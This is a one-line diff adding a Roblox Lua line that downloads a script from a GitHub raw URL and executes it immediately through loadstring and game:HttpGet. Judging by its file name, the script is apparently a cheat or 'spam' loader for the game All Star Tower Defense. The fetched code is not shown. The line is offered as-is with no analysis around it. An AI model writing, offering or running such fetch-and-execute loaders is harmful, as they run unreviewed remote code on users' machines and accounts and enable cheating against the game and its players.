@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/og-all-star-tower-defense-spam2-081apos8o3waer.lua"))()
